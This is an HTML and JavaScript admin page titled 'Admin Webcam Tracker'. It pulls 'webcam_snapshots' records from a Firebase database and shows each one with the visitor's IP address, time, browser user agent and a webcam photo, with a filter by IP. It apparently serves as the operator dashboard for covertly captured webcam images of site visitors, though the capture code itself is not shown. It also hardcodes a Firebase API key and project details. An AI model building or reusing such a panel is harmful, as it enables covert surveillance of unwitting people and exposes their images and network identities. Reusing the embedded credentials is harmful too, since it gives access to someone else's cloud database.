<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Admin Webcam Tracker</title>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
  <style>
    body {
      font-family: 'Courier New', monospace;
      background: #111;
      color: #0f0;
      padding: 1em;
      max-width: 1200px;
      margin: 0 auto;
    }
    .header {
      text-align: center;
      padding: 1em;
      border-bottom: 1px solid #0f0;
      margin-bottom: 2em;
    }
    .entry {
      border: 1px solid #0f0;
      padding: 15px;
      margin: 15px 0;
      border-radius: 5px;
      background: #222;
    }
    img {
      max-width: 100%;
      border: 1px solid #0f0;
      margin-top: 10px;
    }
    select {
      background: black;
      color: lime;
      padding: 8px 15px;
      border: 1px solid #0f0;
      border-radius: 4px;
      font-size: 16px;
      margin: 0 10px;
    }
    .filter-section {
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 20px;
      flex-wrap: wrap;
      gap: 10px;
    }
    .stats {
      text-align: center;
      margin: 20px 0;
      padding: 10px;
      border: 1px solid #0f0;
      border-radius: 5px;
      background: #1a1a1a;
    }
    .count {
      font-weight: bold;
      color: #ff0;
    }
  </style>
</head>
<body>
  <div class="header">
    <h1>Admin Webcam Tracker</h1>
    <p>Data dari Catbox.moe + Firebase</p>
  </div>

  <div class="filter-section">
    <label>Filter IP:</label>
    <select id="ipFilter">
      <option value="all">Semua IP</option>
    </select>
  </div>

  <div class="stats">
    Total: <span id="totalCount" class="count">0</span> | 
    Tampil: <span id="displayCount" class="count">0</span>
  </div>

  <div id="output"></div>

  <script>
    // ðŸ”¥ Konfigurasi Firebase
    const firebaseConfig = {
      apiKey: "AIzaSyCB_wr4EqhPRzSWQuLgr-eyV9Zisw8_rIs",
      authDomain: "xr-social-53646.firebaseapp.com",
      databaseURL: "https://xr-social-53646-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "xr-social-53646",
      storageBucket: "xr-social-53646.appspot.com",
      messagingSenderId: "55685443011",
      appId: "1:55685443011:web:ef0f9de8e329d24d512176"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // ðŸŽ¯ Elemen DOM
    const output = document.getElementById("output");
    const ipFilter = document.getElementById("ipFilter");
    const totalCountEl = document.getElementById("totalCount");
    const displayCountEl = document.getElementById("displayCount");
    let allData = [];

    // ðŸ–¼ï¸ Render data
    function renderData() {
      output.innerHTML = "";
      const selectedIP = ipFilter.value;
      const filtered = selectedIP === "all" 
        ? allData 
        : allData.filter(d => d.ip === selectedIP);

      displayCountEl.textContent = filtered.length;

      filtered.sort((a, b) => b.timestamp - a.timestamp).forEach(d => {
        const div = document.createElement("div");
        div.className = "entry";
        div.innerHTML = `
          <div><b>IP:</b> ${d.ip}</div>
          <div><b>Waktu:</b> ${d.time}</div>
          <div><b>Device:</b> <small>${d.userAgent}</small></div>
          <img src="${d.url}" onerror="this.style.display='none'">
        `;
        output.appendChild(div);
      });
    }

    // ðŸ“¡ Load data dari Firebase
    db.ref("webcam_snapshots").on("value", snapshot => {
      allData = [];
      const ipSet = new Set();

      snapshot.forEach(childSnapshot => {
        const item = childSnapshot.val();
        allData.push(item);
        ipSet.add(item.ip);
      });

      totalCountEl.textContent = allData.length;

      // Update dropdown IP
      const currentIP = ipFilter.value;
      ipFilter.innerHTML = '<option value="all">Semua IP</option>';
      Array.from(ipSet).sort().forEach(ip => {
        const option = document.createElement("option");
        option.value = ip;
        option.textContent = ip;
        if(ip === currentIP) option.selected = true;
        ipFilter.appendChild(option);
      });

      renderData();
    });

    ipFilter.addEventListener("change", renderData);
  </script>
</body>
</html>
